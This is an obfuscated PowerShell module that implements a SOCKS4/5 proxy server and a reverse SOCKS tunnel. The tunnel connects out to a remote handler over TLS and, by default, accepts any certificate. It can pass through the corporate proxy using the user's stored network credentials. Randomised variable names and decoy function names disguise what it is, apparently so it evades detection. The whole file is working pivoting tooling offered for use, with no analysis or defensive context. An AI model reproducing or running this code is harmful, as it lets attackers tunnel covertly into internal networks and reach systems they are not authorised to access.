 
 
 
[ScriptBlock]$IcspCkrH99 = {
    param($vars)
    $RrLqGbnc99 = {
            param($vars)
            $vars.inStream.CopyTo($vars.outStream)
            Exit
    }
    $rsp=$vars.rsp;
    function fruity{
        param($ip)
        IF ($ip -as [ipaddress]){
            return $ip
        }else{
            $ip2 = [System.Net.Dns]::GetHostAddresses($ip)[0].IPAddressToString;
        }
        return $ip2
    }
    $mQoHpLHK99=$vars.cliConnection
    $jshuBvRS99 = New-Object System.Byte[] 32
    try
    {
        $sqKWwHko99 = $vars.cliStream
        $sqKWwHko99.Read($jshuBvRS99,0,2) | Out-Null
        $QiuLqlGv99=$jshuBvRS99[0]
        if ($QiuLqlGv99 -eq 5){
            $sqKWwHko99.Read($jshuBvRS99,2,$jshuBvRS99[1]) | Out-Null
            for ($i=2; $i -le $jshuBvRS99[1]+1; $i++) {
                if ($jshuBvRS99[$i] -eq 0) {break}
            }
            if ($jshuBvRS99[$i] -ne 0){
                $jshuBvRS99[1]=255
                $sqKWwHko99.Write($jshuBvRS99,0,2)
            }else{
                $jshuBvRS99[1]=0
                $sqKWwHko99.Write($jshuBvRS99,0,2)
            }
            $sqKWwHko99.Read($jshuBvRS99,0,4) | Out-Null
            $cmd = $jshuBvRS99[1]
            $atyp = $jshuBvRS99[3]
            if($cmd -ne 1){
                $jshuBvRS99[1] = 7
                $sqKWwHko99.Write($jshuBvRS99,0,2)
                throw "Not a connect"
            }
            if($atyp -eq 1){
                $ipv4 = New-Object System.Byte[] 4
                $sqKWwHko99.Read($ipv4,0,4) | Out-Null
                $TYQVcgrt99 = New-Object System.Net.IPAddress(,$ipv4)
                $pxTqxRFL99 = $TYQVcgrt99.ToString()
            }elseif($atyp -eq 3){
                $sqKWwHko99.Read($jshuBvRS99,4,1) | Out-Null
                $mCVGcFUb99 = New-Object System.Byte[] $jshuBvRS99[4]
                $sqKWwHko99.Read($mCVGcFUb99,0,$jshuBvRS99[4]) | Out-Null
                $pxTqxRFL99 = [System.Text.Encoding]::ASCII.GetString($mCVGcFUb99)
            }
            else{
                $jshuBvRS99[1] = 8
                $sqKWwHko99.Write($jshuBvRS99,0,2)
                throw "Not a valid destination address"
            }
            $sqKWwHko99.Read($jshuBvRS99,4,2) | Out-Null
            $ZIIhewHj99 = $jshuBvRS99[4]*256 + $jshuBvRS99[5]
            $DJQlKbkI99 = fruity($pxTqxRFL99)
            if($DJQlKbkI99 -eq $null){
                $jshuBvRS99[1]=4
                $sqKWwHko99.Write($jshuBvRS99,0,2)
                throw "Cant resolve destination address"
            }
            $xQAfddmn99 = New-Object System.Net.Sockets.TcpClient($DJQlKbkI99, $ZIIhewHj99)
            if($xQAfddmn99.Connected){
                $jshuBvRS99[1]=0
                $jshuBvRS99[3]=1
                $jshuBvRS99[4]=0
                $jshuBvRS99[5]=0
                $sqKWwHko99.Write($jshuBvRS99,0,10)
                $sqKWwHko99.Flush()
                $MLCtJOAi99 = $xQAfddmn99.GetStream() 
                $KawPEVAE99 = $MLCtJOAi99.CopyToAsync($sqKWwHko99)
                $rOQTICGe99 = $sqKWwHko99.CopyToAsync($MLCtJOAi99)
                $rOQTICGe99.AsyncWaitHandle.WaitOne();
                $KawPEVAE99.AsyncWaitHandle.WaitOne();
                
            }
            else{
                $jshuBvRS99[1]=4
                $sqKWwHko99.Write($jshuBvRS99,0,2)
                throw "Cant connect to host"
            }
       }elseif($QiuLqlGv99 -eq 4){
            $cmd = $jshuBvRS99[1]
            if($cmd -ne 1){
                $jshuBvRS99[0] = 0
                $jshuBvRS99[1] = 91
                $sqKWwHko99.Write($jshuBvRS99,0,2)
                throw "Not a connect"
            }
            $sqKWwHko99.Read($jshuBvRS99,2,2) | Out-Null
            $ZIIhewHj99 = $jshuBvRS99[2]*256 + $jshuBvRS99[3]
            $ipv4 = New-Object System.Byte[] 4
            $sqKWwHko99.Read($ipv4,0,4) | Out-Null
            $DJQlKbkI99 = New-Object System.Net.IPAddress(,$ipv4)
            $jshuBvRS99[0]=1
            while ($jshuBvRS99[0] -ne 0){
                $sqKWwHko99.Read($jshuBvRS99,0,1)
            }
            $xQAfddmn99 = New-Object System.Net.Sockets.TcpClient($DJQlKbkI99, $ZIIhewHj99)
            
            if($xQAfddmn99.Connected){
                $jshuBvRS99[0]=0
                $jshuBvRS99[1]=90
                $jshuBvRS99[2]=0
                $jshuBvRS99[3]=0
                $sqKWwHko99.Write($jshuBvRS99,0,8)
                $sqKWwHko99.Flush()
                $MLCtJOAi99 = $xQAfddmn99.GetStream() 
                $KawPEVAE99 = $MLCtJOAi99.CopyToAsync($sqKWwHko99)
                $rOQTICGe99 = $sqKWwHko99.CopyTo($MLCtJOAi99)
                $rOQTICGe99.AsyncWaitHandle.WaitOne();
                $KawPEVAE99.AsyncWaitHandle.WaitOne();
            }
       }else{
            throw "Unknown socks version"
       }
    }
    catch {
    }
    finally {
        if ($mQoHpLHK99 -ne $null) {
            $mQoHpLHK99.Dispose()
        }
        if ($xQAfddmn99 -ne $null) {
            $xQAfddmn99.Dispose()
        }
        Exit;
    }
}
 
function pleasantry{
    param (
 
            [String]$atvNeQcE99 = "0.0.0.0",
 
            [Int]$olhFQhLn99 = 1080,
            [Int]$WnFXBtkd99 = 200
 
     )
    try{
        $wEkvGKsJ99 = new-object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Parse($atvNeQcE99), $olhFQhLn99)
        $wEkvGKsJ99.start()
        $rsp = [runspacefactory]::CreateRunspacePool(1,$WnFXBtkd99);
        $rsp.CleanupInterval = New-TimeSpan -Seconds 30;
        $rsp.open();
        write-host "Listening on port $olhFQhLn99..."
        while($true){
            $mQoHpLHK99 = $wEkvGKsJ99.AcceptTcpClient()
            $sqKWwHko99 = $mQoHpLHK99.GetStream()
            Write-Host "New Connection from " $mQoHpLHK99.Client.RemoteEndPoint
            $vars = [PSCustomObject]@{"cliConnection"=$mQoHpLHK99; "rsp"=$rsp; "cliStream" = $sqKWwHko99}
            $PS3 = [PowerShell]::Create()
            $PS3.RunspacePool = $rsp;
            $PS3.AddScript($IcspCkrH99).AddArgument($vars) | Out-Null
            $PS3.BeginInvoke() | Out-Null
            Write-Host "Threads Left:" $rsp.GetAvailableRunspaces()
        }
     }
    catch{
        throw $_
    }
    finally{
        write-host "Server closed."
        if ($wEkvGKsJ99 -ne $null) {
                  $wEkvGKsJ99.Stop()
           }
        if ($mQoHpLHK99 -ne $null) {
            $mQoHpLHK99.Dispose()
            $mQoHpLHK99 = $null
        }
        if ($PS3 -ne $null -and $xZvJMdgH99 -ne $null) {
            $PS3.EndInvoke($xZvJMdgH99) | Out-Null
            $PS3.Runspace.Close()
            $PS3.Dispose()
        }
    }
}
function unrestrained{
    param (
 
            [String]$pKWLYosh99,
 
            [Int]$vcpkImyc99
     )
    $kRzRYqTN99 = [System.Net.HttpWebRequest]::Create("http://" + $pKWLYosh99 + ":" + $vcpkImyc99 ) 
    $kRzRYqTN99.Method = "CONNECT";
    $proxy = [System.Net.WebRequest]::GetSystemWebProxy();
    $proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
    $kRzRYqTN99.Proxy = $proxy;
    $kRzRYqTN99.timeout = 1000;
    $bLNyFcpx99 = $kRzRYqTN99.GetResponse();
    $kRzRYqTN99.timeout = 100000;
    $AMiawLzV99 = $bLNyFcpx99.GetResponseStream()
    $DeQLiIeB99= [Reflection.BindingFlags] "NonPublic,Instance"
    $ZNRwDCWq99 = $AMiawLzV99.GetType()
    $ZeDyaSlz99 = $ZNRwDCWq99.GetProperty("Connection", $DeQLiIeB99)
    $QGRCIbQL99 = $ZeDyaSlz99.GetValue($AMiawLzV99, $null)
    $YkGKBgJl99 = $QGRCIbQL99.GetType()
    $IEPMseJu99 = $YkGKBgJl99.GetProperty("NetworkStream", $DeQLiIeB99)
    $aUfgwZRP99 = $IEPMseJu99.GetValue($QGRCIbQL99, $null)
    return $QGRCIbQL99, $aUfgwZRP99
}
function bethinks{
    param (
 
            [String]$pKWLYosh99 = "127.0.0.1",
 
            [Int]$vcpkImyc99 = 1080,
            [Switch]$MUHXvArD99 = $false,
            [String]$CoiINLoc99 = "",
            [Int]$WnFXBtkd99 = 200,
            [Int]$yjTCxiZw99 = 0
     )
    try{
        $UjOEvewQ99 = 0;
        $rsp = [runspacefactory]::CreateRunspacePool(1,$WnFXBtkd99);
        $rsp.CleanupInterval = New-TimeSpan -Seconds 30;
        $rsp.open();
        while($true){
            Write-Host "Connecting to: " $pKWLYosh99 ":" $vcpkImyc99
            try{
                if($MUHXvArD99 -eq $false){
                        $mQoHpLHK99 = New-Object System.Net.Sockets.TcpClient($pKWLYosh99, $vcpkImyc99)
                        $oUbYBBrN99 = $mQoHpLHK99.GetStream()
                    }else{
                        $ret = unrestrained -pKWLYosh99 $pKWLYosh99 -vcpkImyc99 $vcpkImyc99
                        $mQoHpLHK99 = $ret[0]
                        $oUbYBBrN99 = $ret[1]
                }
                if($CoiINLoc99 -eq ''){
                    $sqKWwHko99 = New-Object System.Net.Security.SslStream($oUbYBBrN99,$false,({$true} -as[Net.Security.RemoteCertificateValidationCallback]));
                }else{
                    $sqKWwHko99 = New-Object System.Net.Security.SslStream($oUbYBBrN99,$false,({return $args[1].GetCertHashString() -eq $CoiINLoc99 } -as[Net.Security.RemoteCertificateValidationCallback]));
                }
                $sqKWwHko99.AuthenticateAsClient($pKWLYosh99)
                Write-Host "Connected"
                $UjOEvewQ99 = 0;
                $jshuBvRS99 = New-Object System.Byte[] 32
                $cVEulbwP99 = New-Object System.Byte[] 122
                $dNyxnFEQ99 = [System.Text.Encoding]::Default.GetBytes("GET / HTTP/1.1`nHost: "+$pKWLYosh99+"`n`n")
                $sqKWwHko99.Write($dNyxnFEQ99,0,$dNyxnFEQ99.Length)
                $sqKWwHko99.ReadTimeout = 5000
                $sqKWwHko99.Read($cVEulbwP99,0,122) | Out-Null
                $sqKWwHko99.Read($jshuBvRS99,0,5) | Out-Null
                $RqIWgeSs99 = [System.Text.Encoding]::ASCII.GetString($jshuBvRS99)
                if($RqIWgeSs99 -ne "HELLO"){
                    throw "No Client connected";
                }else{
                    Write-Host "Connection received"
                }
                $sqKWwHko99.ReadTimeout = 100000;
                $vars = [PSCustomObject]@{"cliConnection"=$mQoHpLHK99; "rsp"=$rsp; "cliStream" = $sqKWwHko99}
                $PS3 = [PowerShell]::Create()
                $PS3.RunspacePool = $rsp;
                $PS3.AddScript($IcspCkrH99).AddArgument($vars) | Out-Null
                $PS3.BeginInvoke() | Out-Null
                Write-Host "Threads Left:" $rsp.GetAvailableRunspaces()
            }catch{
                $UjOEvewQ99 = $UjOEvewQ99 + 1;
                if (($yjTCxiZw99 -ne 0) -and ($UjOEvewQ99 -eq $yjTCxiZw99)){
                    Throw "Cannot connect to handler, max Number of attempts reached, exiting";
                }
                if ($_.Exception.message -eq 'Exception calling "AuthenticateAsClient" with "1" argument(s): "The remote certificate is invalid according to the validation procedure."'){
                    throw $_
                }
                if ($_.Exception.message -eq 'Exception calling "AuthenticateAsClient" with "1" argument(s): "Authentication failed because the remote party has closed the transport stream."'){
                    sleep 5
                }
                if (($_.Exception.Message.Length -ge 121) -and $_.Exception.Message.substring(0,120) -eq 'Exception calling ".ctor" with "2" argument(s): "No connection could be made because the target machine actively refused'){
                    sleep 5
                }
                try{
                    $mQoHpLHK99.Close()
                    $mQoHpLHK99.Dispose()
                }catch{}
                    sleep -Milliseconds 200
                }
        }
     }
    catch{
        throw $_;
    }
    finally{
        write-host "Server closed."
        if ($mQoHpLHK99 -ne $null) {
            $mQoHpLHK99.Dispose()
            $mQoHpLHK99 = $null
        }
        if ($PS3 -ne $null -and $xZvJMdgH99 -ne $null) {
            $PS3.EndInvoke($xZvJMdgH99) | Out-Null
            $PS3.Runspace.Close()
            $PS3.Dispose()
        }
    }
}
 
function fruity{
    param($ip)
    IF ($ip -as [ipaddress]){
        return $ip
    }else{
        $ip2 = [System.Net.Dns]::GetHostAddresses($ip)[0].IPAddressToString;
        Write-Host "$ip resolved to $ip2"
    }
    return $ip2
}
export-modulemember -function pleasantry
export-modulemember -function bethinks